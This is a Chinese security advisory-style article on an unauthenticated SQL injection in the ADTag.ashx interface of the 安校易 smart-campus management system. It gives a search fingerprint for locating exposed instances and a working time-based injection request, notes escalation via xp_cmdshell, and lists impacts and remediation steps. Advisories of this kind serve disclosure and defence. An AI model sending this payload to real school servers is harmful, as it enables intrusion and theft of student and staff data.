#  【漏洞脚本】安校易智慧校园管理系统 ADTag.ashx SQL注入  
原创 xuzhiyang
                    xuzhiyang  玄武盾网络技术实验室   2026-02-03 02:13  
  
***免责声明：本文仅供安全研究与学习之用，严禁使用本内容进行未经授权的违规渗透测试，遵守网络安全法，共同维护网络安全，违者后果自负。**  
  
****  
每日学习资源分享：  
图形化未授权访问漏洞批量检测工具  
  
更多资源请访问：  
www.xwdjs.ysepan.com  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/UM0M1icqlo0lxt0ibYqVFodyiaLaT0UNgQzWGoibKZIh453k7XHuhicvGbrD4sUAD4bqLKg9BRR6MXrJXTc0M03Wn1g/640?wx_fmt=png&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=0 "")  
  
  
正文  
  
## 一、漏洞核心详情  
  
  
  
智慧校园综合管理平台(安校易)ADTag.ashx接口处存在SQL注入漏洞，未经身份验证的远程攻击者可利用SQL注入漏洞配合数据库xp.cmdshell可以执行任意命令，从而控制服务器。经过分析与研判，该漏洞利用难度低，建议尽快修复。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/UM0M1icqlo0ke6pk4EN9aGa3vzibGT4AqLhwbycDFtjY7zTZK6vy2GZqjjcicT57so2E7q0PCLgQ8v8S9Hph0PN8Q/640?wx_fmt=png&from=appmsg "")  
  
  
漏洞特征：  
```
title="智慧综合管理平台登入"
```  
  
漏洞脚本:  
```
POST /Module/BPCJ/AD_Tag/Controller/ADTag.ashx HTTP/1.1
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Content-Type: application/x-www-form-urlencoded
Connection: close
action=exportExcel&sTagId=';WAITFOR+DELAY+'0:0:5'--
```  
  
## 二、漏洞具体危害  
##   
  
  
由于漏洞利用难度低、无需身份验证，一旦被攻击者利用，将对校园信息化系统和数据安全造成毁灭性打击，具体危害包括：  
  
**服务器完全受控**  
：攻击者可执行任意命令，如修改服务器配置、删除系统文件、植入木马病毒，甚至格式化服务器硬盘，导致系统彻底瘫痪；  
  
**敏感数据泄露/篡改**  
：校园平台存储的学生信息、教职工信息、财务数据、教学管理数据等核心敏感数据，可能被攻击者窃取、篡改或删除，侵犯师生隐私，影响校园正常管理秩序；  
  
**内网渗透扩散**  
：服务器被控制后，攻击者可能以该服务器为跳板，渗透校园内网，攻击其他办公系统、监控系统、教务系统等，扩大攻击范围，引发全面安全事故；  
  
**合规风险与声誉受损**  
：若因漏洞导致数据泄露或系统瘫痪，学校将违反《数据安全法》《个人信息保护法》等相关法规，面临监管处罚，同时损害学校声誉，引发师生及家长的信任危机。  
  
  
## 三、紧急修复建议  
##   
  
  
鉴于该漏洞利用难度低、危害极大，  
建议**所有****部署智慧校园综合管理平台（安校易）的单位，立即开展漏洞排查与修复工作**  
，具体建议如下：  
  
**优先修复漏洞（核心措施）**  
：联系平台开发商（银达汇智）获取官方漏洞修复补丁，立即对 ADTag.ashx  
 接口进行升级修复；若暂时无法获取补丁，可临时对该接口进行访问限制，禁止外部IP访问，同时对接口输入参数进行严格过滤，拦截恶意SQL语句输入，阻断注入攻击路径。  
  
**禁用危险存储过程**  
：临时禁用数据库中的 xp.cmdshell  
 存储过程（该过程是攻击者执行系统命令的关键），减少漏洞被利用后的危害范围；修复完成后，根据实际业务需求，谨慎开启并做好权限管控，遵循最小权限原则，限制数据库账号的操作权限，避免权限过高导致攻击危害扩大。  
  
**全面排查安全隐患**  
：修复漏洞后，对服务器进行全面安全扫描，检查是否存在攻击者遗留的木马、后门程序，同时排查平台其他接口是否存在类似SQL注入等安全漏洞，做到防患于未然；可借助SQLMap、Burp Suite等自动化工具进行漏洞检测，提升排查效率。  
  
**加强日志监测**  
：开启服务器和数据库的审计日志功能，实时监测异常访问、异常命令执行等行为，一旦发现可疑操作，立即阻断并排查，留存日志用于后续溯源分析；生产环境需关闭详细错误信息，避免向攻击者暴露数据库结构。  
  
**临时防护补充**  
：配置Web应用防火墙（WAF），拦截SQL注入相关的恶意请求，作为漏洞修复过渡期的临时防护措施，但不可完全依赖WAF，需以接口代码修复为根本解决方案。  
  
  
  
随手点个「推荐」吧！  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/UM0M1icqlo0knIjq7rj7rsX0r4Rf2CDQylx0IjMfpPM93icE9AGx28bqwDRau5EkcWpK6WBAG5zGDS41wkfcvJiaA/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp#imgIndex=5 "")  
  
声明：  
技术文章均收集于互联网，仅作为本人学习、记录使用。  
侵权删  
！  
！  
  
